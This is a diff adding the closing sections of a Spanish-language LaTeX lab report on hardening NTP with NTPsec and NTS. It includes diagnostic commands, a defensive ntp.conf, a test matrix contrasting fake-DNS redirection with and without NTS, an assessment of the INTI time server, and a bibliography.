+\subsection{Fuentes y calidad de sincronización}
+
+\begin{lstlisting}[style=terminal]
+ntpq -pn
+ntpq -c rv
+ntptime
+\end{lstlisting}
+
+Debe existir una fuente seleccionada, varias fuentes alcanzables y offsets razonables. Un \texttt{reach} persistentemente igual a cero o saltos recurrentes son señales de error.
+
+\subsection{Validación específica de NTS}
+
+\begin{lstlisting}[style=terminal]
+ntpq -c nts
+journalctl -u ntpsec --since "30 minutes ago" --no-pager | grep -Ei 'NTS|TLS|cert|cookie'
+\end{lstlisting}
+
+La documentación oficial de \ntpsec{} muestra como evidencia normal una negociación TLS válida, certificado correcto, ALPN NTS y recepción de cookies \cite{ntpsecnts}.
+
+\subsection{Prueba de resiliencia}
+
+En laboratorio, se puede bloquear temporalmente una fuente y observar si el cliente migra a otra sin perder sincronización. También puede probarse una resolución DNS falsa contra un servidor configurado con \texttt{nts}: el resultado esperado es un fallo de autenticación, no la aceptación silenciosa del servidor falso.
+
+\section{Evaluación de \texttt{ntp.inta.gov.ar} / \texttt{ntp.inti.gob.ar}}
+
+El enunciado consulta por \texttt{ntp.inta.gov.ar}. Las fuentes oficiales consultadas no publican ese nombre. El servidor argentino oficialmente documentado es \textbf{\texttt{ntp.inti.gob.ar}}, perteneciente al \textbf{Instituto Nacional de Tecnología Industrial (INTI)}, no al INTA.
+
+INTI publica que mantiene un servidor NTP para transferir la realización UTC(INTI) vía Internet y proporciona explícitamente el hostname \texttt{ntp.inti.gob.ar} \cite{inti}. El informe de servicios de diseminación de tiempo 2025 del Bureau International des Poids et Mesures (BIPM), publicado en 2026, también registra que INTI opera un servidor NTP de acceso abierto referenciado a UTC(INTI) con ese mismo nombre \cite{bipm2025}. Por lo tanto, desde el punto de vista de \textbf{autoridad de la fuente temporal}, se trata de una fuente institucional y legítima.
+
+Sin embargo, hay que diferenciar \emph{confiabilidad de la fuente} de \emph{seguridad criptográfica del transporte}. La documentación pública de INTI consultada describe NTP abierto, pero no anuncia NTS. En consecuencia, \textbf{no debe asumirse que \texttt{ntp.inti.gob.ar} ofrece autenticación NTS}. Si se consume por NTP clásico, un atacante que controle la red entre el cliente y el servidor todavía podría intentar ataques MITM o de demora.
+
+\subsection{Conclusión sobre INTI}
+
+\begin{itemize}
+    \item \textbf{Sí es una fuente legítima y de alta confianza institucional} para hora argentina/UTC(INTI), respaldada por documentación oficial de INTI y BIPM.
+    \item \textbf{No debe considerarse automáticamente ``NTP seguro''} sólo por ser un servidor oficial. Si el transporte es NTP clásico, no existe autenticación criptográfica equivalente a NTS.
+    \item En un sistema sensible, puede utilizarse como una de varias referencias, junto con fuentes NTS autenticadas, o proteger el acceso mediante una arquitectura de red controlada.
+    \item Configurar un único servidor, aun cuando sea confiable, reduce redundancia. RFC 8633 recomienda múltiples fuentes diversas para mayor robustez.
+\end{itemize}
+
+\section{Configuración final recomendada}
+
+Para una estación Linux de propósito general que requiera seguridad razonable y no deba servir tiempo a otros equipos, se propone:
+
+\begin{lstlisting}[style=terminal]
+# /etc/ntpsec/ntp.conf
+
+driftfile /var/lib/ntpsec/ntp.drift
+
+restrict default kod limited nomodify noquery
+restrict 127.0.0.1
+restrict ::1
+
+# Diversidad de proveedores con autenticacion NTS
+server time.cloudflare.com nts iburst
+server nts.netnod.se nts iburst
+server ptbtime1.ptb.de nts iburst
+server ptbtime4.ptb.de nts iburst
+
+# INTI puede mantenerse como referencia adicional no autenticada
+# si se acepta conscientemente ese modelo de riesgo:
+# server ntp.inti.gob.ar iburst noselect
+\end{lstlisting}
+
+La opción \texttt{noselect}, si está disponible en la versión instalada, permite observar una fuente sin permitir que participe en la selección del reloj. De esa forma puede compararse UTC(INTI) con fuentes NTS sin degradar el requisito de autenticación de las fuentes seleccionables. Si la versión o política local no emplea \texttt{noselect}, es preferible consultar INTI de forma puntual con una herramienta de diagnóstico y no incorporarlo al conjunto de fuentes de producción que se desea mantener exclusivamente autenticado.
+
+\section{Matriz de pruebas sugerida}
+
+\begin{tabularx}{\textwidth}{>{\bfseries}p{3.4cm} X X}
+\toprule
+\textbf{Prueba} & \textbf{Resultado esperado} & \textbf{Evidencia} \\
+\midrule
+Consulta NTP normal & Offset pequeño contra una fuente legítima. & \texttt{ntpdig}, \texttt{ntpq -pn}. \\
+DNS falso + NTP sin NTS & El cliente consulta al servidor de laboratorio y observa un offset cercano a +600 s. & \texttt{getent}, \texttt{tcpdump}, \texttt{ntpdig}. \\
+DNS falso + NTS & La autenticación falla; no se acepta el servidor falso. & Logs de NTS-KE/TLS. \\
+Caída de una fuente & Las fuentes restantes mantienen sincronización. & Cambio de peer seleccionado en \texttt{ntpq -p}. \\
+Intento de consulta remota & Las consultas de control desde hosts no autorizados quedan restringidas. & \texttt{ntpq} remoto y logs. \\
+Verificación de INTI & El hostname correcto es \texttt{ntp.inti.gob.ar}; se trata de un servicio oficial abierto. & Fuentes INTI y BIPM. \\
+\bottomrule
+\end{tabularx}
+
+\section{Limitaciones del trabajo}
+
+La práctica puede resolverse en su totalidad a nivel conceptual y de laboratorio controlado. Existe una única limitación que no debe ocultarse: \textbf{no es posible conocer la configuración NTP actual del equipo físico del alumno sin acceso a ese host o sin sus salidas de terminal}. En este informe se proporciona el procedimiento exacto para obtenerla y una configuración final de referencia. Inventar ese dato disminuiría la validez técnica del trabajo.
+
+Tampoco se realizaron pruebas ofensivas contra \texttt{ntp.inti.gob.ar} ni contra ningún servidor público. La evaluación de seguridad del servicio se basa exclusivamente en documentación pública y en las propiedades del protocolo. Realizar MITM, inyección, fuzzing o carga contra un sistema institucional sin autorización no forma parte de esta práctica.
+
+\section{Conclusiones}
+
+NTP sigue siendo un componente crítico de infraestructura cuya seguridad suele subestimarse. El protocolo básico ofrece buena precisión y mecanismos robustos de selección de fuentes, pero la operación cliente-servidor sin autenticación no garantiza criptográficamente que una respuesta proceda del servidor esperado. Un adversario con control de DNS, del punto de acceso o del camino de red puede intentar redirigir o manipular la sincronización. El impacto puede abarcar disponibilidad de autenticación, validación de certificados, tareas programadas y, especialmente, la confiabilidad de logs y evidencia forense.
+
+\ntpsec{} reduce la superficie de ataque de NTP clásico y elimina componentes heredados inseguros. Su soporte de \nts{} permite autenticar al servidor mediante TLS y proteger la integridad de los intercambios NTP sin convertir cada paquete de sincronización en una sesión TLS. La práctica de laboratorio demuestra la diferencia fundamental: una redirección DNS puede engañar a un cliente NTP sin autenticación, mientras que un cliente NTS correctamente configurado exige una identidad criptográfica que el servidor falso no posee.
+
+La estrategia recomendada combina software actualizado, varias fuentes diversas, NTS, restricciones de control, filtrado de red y monitoreo continuo. El servidor \texttt{ntp.inti.gob.ar} es una fuente oficial y legítima de UTC(INTI), documentada por INTI y BIPM, pero la documentación pública consultada no permite afirmar que ofrezca NTS. Por ello, su legitimidad institucional no debe confundirse con autenticación criptográfica del transporte.
+
+Finalmente, la hora debe tratarse como un activo de seguridad: una arquitectura que protege identidades, certificados y logs pero confía ciegamente en una fuente temporal no autenticada conserva una dependencia susceptible de manipulación.
+
+\newpage
+\begin{thebibliography}{99}
+
+\bibitem{rfc5905}
+D. Mills et al., \emph{Network Time Protocol Version 4: Protocol and Algorithms Specification}, RFC 5905, IETF, 2010.\\
+\url{https://www.rfc-editor.org/rfc/rfc5905}
+
+\bibitem{rfc7384}
+T. Mizrahi, \emph{Security Requirements of Time Protocols in Packet Switched Networks}, RFC 7384, IETF, 2014.\\
+\url{https://www.rfc-editor.org/rfc/rfc7384}
+
+\bibitem{rfc8633}
+D. Reilly, H. Stenn y D. Sibold, \emph{Network Time Protocol Best Current Practices}, RFC 8633 / BCP 223, IETF, 2019.\\
+\url{https://www.rfc-editor.org/rfc/rfc8633}
+
+\bibitem{rfc8915}
+D. Franke et al., \emph{Network Time Security for the Network Time Protocol}, RFC 8915, IETF, 2020.\\
+\url{https://www.rfc-editor.org/rfc/rfc8915}
+
+\bibitem{ntpsecquick}
+NTPsec Project, \emph{Client Quick Start Guide}, documentación actual consultada el 12/09/2026.\\
+\url{https://docs.ntpsec.org/latest/quick.html}
+
+\bibitem{ntpsecnts}
+NTPsec Project, \emph{NTS Quick Start Guide}, documentación actual consultada el 12/09/2026.\\
+\url{https://docs.ntpsec.org/latest/NTS-QuickStart.html}
+
+\bibitem{ntpsecdifferences}
+NTPsec Project, \emph{Differences from NTP Classic}, documentación actual consultada el 12/09/2026.\\
+\url{https://docs.ntpsec.org/latest/ntpsec.html}
+
+\bibitem{ntpdig}
+NTPsec Project, \emph{ntpdig -- Simple Network Time Protocol Client}, consultado el 12/09/2026.\\
+\url{https://docs.ntpsec.org/latest/ntpdig.html}
+
+\bibitem{ntpsec125}
+NTPsec Project, \emph{NTPsec 1.2.5 released}, 31/07/2026.\\
+\url{https://lists.ntpsec.org/pipermail/devel/2026-July/011029.html}
+
+\bibitem{ntpclassic}
+Network Time Foundation, \emph{NTP Release Timeline / NTP 4.2.8p18}, consultado el 12/09/2026.\\
+\url{https://www.ntp.org/dev/releasetimeline/}
+
+\bibitem{cve20149295}
+Network Time Foundation, \emph{NTP 4.2.8 Release Announcement -- CVE-2014-9295}, consultado el 12/09/2026.\\
+\url{https://www.ntp.org/support/securitynotice/4_2_8-release-announcement/}
+
+\bibitem{cve202015025}
+Network Time Foundation, \emph{NTP Bug 3661 -- CVE-2020-15025}, consultado el 12/09/2026.\\
+\url{https://www.ntp.org/support/securitynotice/ntpbug3661/}
+
+\bibitem{cve20232655x}
+Network Time Foundation, \emph{NTP Bug 3806 -- CVE-2023-26551/52/53/54}, consultado el 12/09/2026.\\
+\url{https://www.ntp.org/support/securitynotice/ntpbug3806/}
+
+\bibitem{bug3767}
+Network Time Foundation, \emph{NTP Bug 3767 -- KoD RATE assertion abort}, consultado el 12/09/2026.\\
+\url{https://www.ntp.org/support/securitynotice/ntpbug3767/}
+
+\bibitem{cloudflarents}
+Cloudflare, \emph{Network Time Security}, actualizado el 24/04/2026, consultado el 12/09/2026.\\
+\url{https://developers.cloudflare.com/time-services/nts/}
+
+\bibitem{netnodnts}
+Netnod, \emph{How to use NTS}, consultado el 12/09/2026.\\
+\url{https://www.netnod.se/netnod-time/how-to-use-nts}
+
+\bibitem{ptbnts}
+Physikalisch-Technische Bundesanstalt (PTB), \emph{Time synchronization of computers using NTP / NTS}, consultado el 12/09/2026.\\
+\url{https://www.ptb.de/cms/en/ptb/fachabteilungen/abt9/gruppe-95/ref-952/time-synchronization-of-computers-using-the-network-time-protocol-ntp.html}
+
+\bibitem{inti}
+Instituto Nacional de Tecnología Industrial (INTI), \emph{¿Qué es la hora INTI?}, consultado el 12/09/2026.\\
+\url{https://www.inti.gob.ar/hora-inti}
+
+\bibitem{bipm2025}
+Bureau International des Poids et Mesures (BIPM), \emph{Time Dissemination Services -- 2025}, publicado en 2026. Entrada INTI: servidor abierto \texttt{ntp.inti.gob.ar}.\\
+\url{https://webtai.bipm.org/ftp/pub/tai/annual-reports/bipm-annual-report/TIMESERVICES/timeservices_2025.pdf}
+
+\bibitem{guialab}
+Material suministrado para la práctica, \emph{Escenario de laboratorio: desvío de peticiones NTP y defensa con NTPsec/NTS}, archivo \texttt{redteam\_ntp.pdf}.
+
+\end{thebibliography}
+
+\end{document}
